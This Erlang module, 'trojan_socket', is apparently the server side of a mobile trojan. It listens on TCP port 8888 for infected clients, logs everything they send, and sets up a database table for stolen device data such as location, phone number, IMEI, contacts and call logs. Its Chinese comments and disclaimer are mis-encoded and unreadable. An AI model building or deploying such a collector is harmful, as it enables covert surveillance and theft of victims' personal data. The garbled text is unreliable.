%% ============================================================================
%% @author é’Ÿæ™ºå¼º
%% @email johnmelodymel@qq.com
%%
%% ============================================================================
%% == é‡è¦å£°æ˜ ==
%% ============================================================================
%% æœ¬ç¨‹åºä»…ä¾›å­¦ä¹ å’ŒæŠ€æœ¯ç ”ç©¶ä½¿ç”¨ï¼Œç¦æ­¢å°†å…¶ç”¨äºä»»ä½•æœªè·æˆæƒçš„ä¾µå…¥ã€
%% æ”»å‡»ã€ç›‘å¬ã€å¹²æ‰°æˆ–å…¶ä»–è¿åç½‘ç»œå®‰å…¨å’Œéšç§ä¿æŠ¤çš„è¡Œä¸ºã€‚
%%
%% ä½¿ç”¨è€…å¿…é¡»åœ¨**å®Œå…¨ç†è§£å¹¶åŒæ„ä¸Šè¿°æ¡æ¬¾**çš„å‰æä¸‹ä½¿ç”¨æœ¬ç¨‹åºã€‚
%% ä»»ä½•å°†æœ¬ç¨‹åºç”¨äº**éæ³•ç›®çš„**çš„è¡Œä¸ºï¼Œå…¶**æ‰€æœ‰åæœ**ï¼ˆåŒ…æ‹¬ä½†ä¸é™äº
%% è¡Œæ”¿å¤„ç½šã€æ°‘äº‹èµ”å¿ã€åˆ‘äº‹è´£ä»»ï¼‰**å‡ç”±ä½¿ç”¨è€…è‡ªè¡Œæ‰¿æ‹…**ã€‚
%%
%% è¯·åŠ¡å¿…éµå®ˆæ‚¨æ‰€åœ¨å›½å®¶å’Œåœ°åŒºçš„ç›¸å…³æ³•å¾‹æ³•è§„ï¼Œç‰¹åˆ«æ˜¯ä»¥ä¸‹ä¸­å›½æ³•å¾‹æ¡æ¬¾ï¼š
%%
%% - ã€Šä¸­åäººæ°‘å…±å’Œå›½ç½‘ç»œå®‰å…¨æ³•ã€‹ ç¬¬åäºŒæ¡ï¼šä»»ä½•ä¸ªäººå’Œç»„ç»‡ä¸å¾—åˆ©ç”¨ç½‘ç»œ
%%   ä»äº‹å±å®³å›½å®¶å®‰å…¨ã€è£èª‰å’Œåˆ©ç›Šï¼Œç…½åŠ¨é¢ è¦†å›½å®¶æ”¿æƒç­‰è¿æ³•çŠ¯ç½ªæ´»åŠ¨ã€‚
%% - ã€Šä¸­åäººæ°‘å…±å’Œå›½åˆ‘æ³•ã€‹ ç¬¬äºŒç™¾å…«åäº”æ¡è‡³äºŒç™¾å…«åä¸ƒæ¡ï¼š
%%   éæ³•ä¾µå…¥è®¡ç®—æœºä¿¡æ¯ç³»ç»Ÿã€ç ´åç³»ç»ŸåŠŸèƒ½æˆ–æ•°æ®çš„è¡Œä¸ºå°†è¢«è¿½ç©¶åˆ‘äº‹è´£ä»»ã€‚
%% - ã€Šä¸­åäººæ°‘å…±å’Œå›½æ•°æ®å®‰å…¨æ³•ã€‹ ç¬¬ä¸‰æ¡ã€ç¬¬åä¸ƒæ¡ï¼š
%%   ä»äº‹æ•°æ®å¤„ç†æ´»åŠ¨åº”å½“ä¾æ³•ä¿éšœæ•°æ®å®‰å…¨ï¼Œç¦æ­¢éæ³•è·å–ã€æ³„éœ²æ•°æ®ã€‚
%%
%% ğŸ’¡ç‰¹åˆ«æé†’ï¼šæœ¬ç¨‹åºè®¾è®¡ä¸­å¯èƒ½æ¶‰åŠç½‘ç»œé€šä¿¡ã€æ•°æ®æ”¶é›†ã€è¿œç¨‹æ§åˆ¶ç­‰åŠŸèƒ½ï¼Œ
%% å‡åº”åœ¨**æˆæƒèŒƒå›´å†…**ä½¿ç”¨ï¼Œä»»ä½•å¯¹è®¾å¤‡ã€ç³»ç»Ÿã€æ•°æ®çš„æœªç»æˆæƒçš„è®¿é—®æˆ–æ§åˆ¶
%% éƒ½å±äºè¿æ³•è¡Œä¸ºã€‚
%%
%% ğŸ“› è¿åä»¥ä¸Šæ¡æ¬¾é€ æˆçš„ä¸€åˆ‡æ³•å¾‹åæœä¸è´£ä»»ï¼Œä¸ä½œè€…æ— å…³ã€‚
%%
%% ============================================================================
%%
%% @doc æœ¨é©¬åå°æœåŠ¡æ¨¡å—ï¼Œæä¾›TCPå¥—æ¥å­—ç›‘å¬å’Œæ•°æ®å¤„ç†åŠŸèƒ½ã€‚
%% ä¸»è¦åŠŸèƒ½åŒ…æ‹¬ï¼š
%% - åˆ›å»ºMnesiaæ•°æ®åº“è¡¨å­˜å‚¨è®¾å¤‡ä¿¡æ¯
%% - ç›‘å¬æŒ‡å®šç«¯å£æ¥æ”¶å®¢æˆ·ç«¯è¿æ¥
%% - å¤„ç†æ¯ä¸ªè¿æ¥çš„å®¢æˆ·ç«¯æ•°æ®
%% - è®°å½•è¯¦ç»†çš„è¿æ¥å’Œæ•°æ®å¤„ç†æ—¥å¿—
%% 
%% ä½¿ç”¨ç¤ºä¾‹ï¼š
%% 1. è°ƒç”¨create_schema/0åˆ›å»ºæ•°æ®åº“æ¶æ„
%% 2. è°ƒç”¨create_table/0åˆ›å»ºè®¾å¤‡ä¿¡æ¯è¡¨
%% 3. è°ƒç”¨start/0å¯åŠ¨TCPç›‘å¬æœåŠ¡
%% 
%% æ—¥å¿—çº§åˆ«æ”¯æŒï¼šinfo, warning, error
%% é»˜è®¤ç›‘å¬ç«¯å£ï¼š8888
%% é»˜è®¤IPåœ°å€ï¼š0.0.0.0

-module(trojan_socket).
-export([start/0]).
-export([create_schema/0, create_table/0]).

-define(DEFAULT_NAME, "æœ¨é©¬åå°").
-define(DEFAULT_PORT, 8888).
-define(DEFAULT_IP, {0,0,0,0}).
-define(DEFAULT_BUFSIZE, 1024).

-record(device_info, {
    id,                 % integer() æˆ– string()
    ip,                 % string()
    image,              % string() (è·¯å¾„/Base64)
    current_location,   % string()
    phone_number,       % string()
    phone_model,        % string()
    os_version,         % string()
    network_carrier,    % string()
    imei_number,        % string()
    contacts,           % string() (JSON å½¢å¼)
    call_logs           % string() (JSON å½¢å¼)
}).

% ANSI é¢œè‰²ä»£ç  - æˆ‘ä»¬çš„å°å½©è™¹ç³–æœç›’ï¼ğŸ¬ğŸŒˆ
-define(ANSI_RESET, "\e[0m").       % å˜å›åŸæ¥çš„é¢œè‰²å“¦
-define(ANSI_RED, "\e[31m").        % çƒ­æƒ…çš„å°çº¢å”‡ ğŸ’‹
-define(ANSI_GREEN, "\e[32m").      % æ¸…æ–°çš„å°ç»¿å¶ ğŸŒ¿
-define(ANSI_YELLOW, "\e[33m").     % æš–æš–çš„å°å¤ªé˜³ â˜€ï¸
-define(ANSI_BLUE, "\e[34m").       % æ¸©æŸ”çš„è“å¤©ç™½äº‘ â˜ï¸ (è¿™ä¸ªå…ˆç•™ç€ï¼Œä»¥åæƒ³ç”¨åˆ«çš„é¢œè‰²å°±å¯ä»¥å•¦)

% æ–°å¢çš„æ—¥å¿—è¾…åŠ©å‡½æ•°ï¼ŒèŒèŒå“’ï½
log(Level, FormatString, Args) ->
    {{Y,Mo,D},{H,M,S}} = calendar:local_time(),
    Timestamp = io_lib:format("~4..0w-~2..0w-~2..0w ~2..0w:~2..0w:~2..0w", [Y,Mo,D,H,M,S]),
    LevelStr = if
        is_atom(Level) -> atom_to_list(Level);
        is_list(Level) -> Level
    end,

    % æ ¹æ®æ—¥å¿—çº§åˆ«é€‰ä¸ªæ¼‚äº®çš„é¢œè‰²å§ï½
    Color = case Level of
        info    -> ?ANSI_GREEN;  % ä½ çœ‹ï¼Œinfo æ¶ˆæ¯æ˜¯æ¸…æ–°çš„ç»¿è‰²ï½
        warning -> ?ANSI_YELLOW; % warning æ¶ˆæ¯æ˜¯æš–æš–çš„é»„è‰²ï½
        error   -> ?ANSI_RED;    % error æ¶ˆæ¯æ˜¯é†’ç›®çš„çº¢è‰²ï½
        _       -> ""           % å¦‚æœæ˜¯åˆ«çš„çº§åˆ«ï¼Œå°±å…ˆä¸ç”¨é¢œè‰²å•¦
    end,

    % æˆ‘ä»¬æŠŠæ—¶é—´æˆ³å’Œæ—¥å¿—çº§åˆ«ä½œä¸ºå‚æ•°ä¼ ç»™ io:formatï¼Œ
    % FormatString æ˜¯ä½ åŸæ¥å†™çš„æ ¼å¼å­—ç¬¦ä¸²ï¼Œå§å§æŠŠå®ƒæ‹¼æ¥åˆ°åé¢ï½
    % ç”¨é€‰å¥½çš„é¢œè‰²æŠŠæ¶ˆæ¯åŒ…èµ·æ¥ï¼Œæœ€åå†ç”¨ ?ANSI_RESET å˜å›åŸæ¥çš„é¢œè‰²ï¼Œè¿™æ ·å°±ä¸ä¼šå½±å“å…¶ä»–æ–‡å­—å•¦ï¼
    % æœ€ååŠ ä¸Šä¸€ä¸ªæ¢è¡Œç¬¦ \nï¼Œè®©æ—¥å¿—çœ‹èµ·æ¥æ•´æ•´é½é½ï¼
    io:format(Color ++ "~s [~s] " ++ FormatString ++ ?ANSI_RESET ++ "~n", [Timestamp, LevelStr | Args]).

% è¿™ä¸ªæ–°å‡½æ•°ä¸“é—¨è´Ÿè´£æ‹›å¾…æ¯ä¸€ä½è¿æ¥ä¸Šçš„"å°å¯çˆ±"å“¦
handle_connection(Socket) ->
    case inet:peername(Socket) of
        {ok, PeerIP} ->
            log(info, "å“‡ï¼Œæœ‰ä¸€ä¸ªå°å¯çˆ±è¿æ¥ä¸Šå•¦ï¼åœ°å€æ˜¯: ~p", [PeerIP]);
        {error, PeernameErrorReason} ->
            log(error, "å“å‘€ï¼Œè·å–å°å¯çˆ±åœ°å€å¤±è´¥äº†: ~p", [PeernameErrorReason])
    end,
    receive_all(Socket),
    gen_tcp:close(Socket),
    log(info, "å’Œå°å¯çˆ±çš„è¿æ¥å·²æ¸©æŸ”å…³é—­ã€‚", []).

% æ–°å¢ï¼šå¾ªç¯è¯»å–æ‰€æœ‰æ•°æ®ï¼Œç›´åˆ° closed
receive_all(Socket) ->
    log(info, "äººå®¶åœ¨ç­‰æ•°æ®å•¦ï¼ŒSocketæ˜¯: ~p", [Socket]),
   
    case gen_tcp:recv(Socket, 0, 5000) of  % Changed timeout to 5 seconds, and size to 0 for auto-size
        {ok, <<>>} ->
            log(info, "ä¸€ä¸ªå­—èŠ‚éƒ½æœ¨æœ‰æ”¶åˆ°å‘¢ï¼Œç»§ç»­ç­‰å‘€ç­‰ï½", []),
            receive_all(Socket);
        {ok, BinData} ->
            log(info, "å“‡å“¦ï¼ŒäºŒè¿›åˆ¶å°å®è´æ¥äº†: ~p", [BinData]),
            case catch binary_to_list(BinData) of
                Str when is_list(Str) ->
                    log(info, "è§£ç æˆå­—ç¬¦ä¸²å•¦: ~s", [Str]);
                _ ->
                    log(info, "è¿™ä¸ªæ•°æ®äººå®¶è½¬ä¸æˆå­—ç¬¦ä¸²å•¦ï½å¥½å¯æƒœå“¦ï½", [])
            end,
            receive_all(Socket);
        {error, timeout} ->
            log(warning, "ç­‰å¾—èŠ±å„¿éƒ½è°¢å•¦ï¼Œè¿˜æ˜¯ç©ºç©ºå¦‚ä¹Ÿï½å˜¤å˜¤å˜¤ï½", []);
        {error, closed} ->
            log(info, "å¯¹æ–¹å°å¯çˆ±æŠŠè¿æ¥å…³æ‰å•¦ï½", []);
        {error, RecvErrorReason} ->
            log(error, "å“å‘€ï¼Œæ”¶æ¶ˆæ¯çš„æ—¶å€™å‡ºå°é—®é¢˜äº†: ~p", [RecvErrorReason])
    end.

% è¿™ä¸ªæ–°å‡½æ•°å°±æ˜¯æˆ‘ä»¬çš„â€œå¾ªç¯ç­‰å¾…â€é­”æ³•ï¼Œè®©æœåŠ¡å™¨èƒ½ä¸€ç›´ç­‰å¾…æ–°çš„å°å¯çˆ±
accept_loop(ListenSocket) ->
    log(info, "æœåŠ¡å™¨æ­£åœ¨è€å¿ƒç­‰å¾…æ–°çš„å°å¯çˆ±è¿æ¥ä¸­...", []), % åŠ ä¸ªæ—¥å¿—ï¼Œè¡¨ç¤ºæ­£åœ¨ç­‰å¾…
    case gen_tcp:accept(ListenSocket) of
        {ok, Socket} ->
            % æœ‰æ–°çš„å°å¯çˆ±æ¥å•¦ï¼è®© handle_connection å»æ‹›å¾…å®ƒ
            spawn(fun() -> handle_connection(Socket) end), % ä¸ºæ¯ä¸ªè¿æ¥åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œè¿™æ ·å¯ä»¥åŒæ—¶æ‹›å¾…å¤šä¸ªå°å¯çˆ±ï¼
            accept_loop(ListenSocket); % æ‹›å¾…å®Œï¼ˆæˆ–è€…è¯´ï¼Œå¯åŠ¨äº†æ‹›å¾…è¿›ç¨‹åï¼‰ï¼Œé©¬ä¸Šå›åˆ°è¿™é‡Œï¼Œç»§ç»­ç­‰å¾…ä¸‹ä¸€ä¸ªï¼
        {error, closed} -> % è¿™ä¸ªè¡¨ç¤º ListenSocket è‡ªå·±è¢«å…³é—­äº†ï¼Œæ¯”å¦‚è¢«å…¶ä»–åœ°æ–¹çš„ä»£ç å…³äº†
            log(info, "ç›‘å¬çš„è€³æœµå¥½åƒè¢«å…³æ‰äº†ï¼Œä¸å†æ¥å—æ–°çš„å°å¯çˆ±å•¦ã€‚", []);
        {error, AcceptErrorReason} ->
            % å¦‚æœæ˜¯å…¶ä»–ç­‰å¾…è¿æ¥çš„é”™è¯¯ï¼Œæˆ‘ä»¬å°±è®°å½•ä¸‹æ¥ï¼Œç„¶åæœåŠ¡å™¨å°±ä¼‘æ¯äº†ï¼ˆå¾ªç¯åœæ­¢ï¼‰
            log(error, "ç­‰å¾…å°å¯çˆ±è¿æ¥çš„æ—¶å€™å‡ºé”™äº† (è¿æ¥å°å¯çˆ±çš„æ—¶å€™å‡ºé”™äº†): ~p. æœåŠ¡å™¨å†³å®šå…ˆä¼‘æ¯ä¸€ä¸‹ã€‚", [AcceptErrorReason])
            % å¾ªç¯åœ¨è¿™é‡Œé€šè¿‡ä¸å†æ¬¡è°ƒç”¨ accept_loop æ¥ç»ˆæ­¢
    end.

% start/0 å‡½æ•°ç°åœ¨å˜å¾—æ›´ç®€æ´å•¦ï¼Œå®ƒè´Ÿè´£å¼€å¯ç›‘å¬ï¼Œç„¶åæŠŠæ‹›å¾…å®¢äººçš„ä»»åŠ¡äº¤ç»™ accept_loop
start() ->
    mnesia:start(),
    % ç›‘å¬ç«¯å£ï¼Œå¦‚æœå¤±è´¥äº†ï¼Œæˆ‘ä»¬å°±ç”¨æ–°çš„logå‡½æ•°è®°å½•ä¸‹æ¥
    case gen_tcp:listen(?DEFAULT_PORT, [
        binary,
        {ip, ?DEFAULT_IP},
        {packet, 0},
        {active, false},  % Keep using passive mode
        {reuseaddr, true},
        {backlog, 5} % ç­‰å¾…é˜Ÿåˆ—é‡Œå¯ä»¥æ’5ä¸ªå°å¯çˆ±
    ]) of
        {ok, ListenSocket} ->
            log(info, "æœåŠ¡å™¨æ­£åœ¨ç«¯å£ ~p:~p ä¸Šæ‚„æ‚„ç›‘å¬å“¦...", [?DEFAULT_IP, ?DEFAULT_PORT]),
            accept_loop(ListenSocket), % æŠŠæ‹›å¾…å¤§ä»»äº¤ç»™ accept_loopï¼
            % ä¸‹é¢çš„ä»£ç åªæœ‰åœ¨ accept_loop å› ä¸ºæŸç§åŸå› åœæ­¢åæ‰ä¼šæ‰§è¡Œ
            % ï¼ˆæ¯”å¦‚ ListenSocket è¢«å…³é—­äº†ï¼Œæˆ–è€… accept å‡ºé”™äº†ï¼‰
            gen_tcp:close(ListenSocket), % ç¡®ä¿åœ¨æœåŠ¡ç»“æŸæ—¶å…³é—­ç›‘å¬å¥—æ¥å­—
            log(info, "ç›‘å¬æœåŠ¡å·²æ­£å¼åœæ­¢ï¼ŒæœåŠ¡å™¨æ™šå®‰ï½", []);
        {error, ListenErrorReason} ->
            log(error, "å¯åŠ¨ç›‘å¬æœåŠ¡å¤±è´¥äº†ï¼Œå‘œå‘œå‘œ: ~pã€‚æœåŠ¡å™¨å¼€ä¸èµ·æ¥äº†ã€‚", [ListenErrorReason])
    end.

create_table() ->
    mnesia:create_table(device_info, [
        {attributes, record_info(fields, device_info)},
        {disc_copies, [node()]},
        {type, set}
    ]).

create_schema() ->
    mnesia:create_schema([node()]).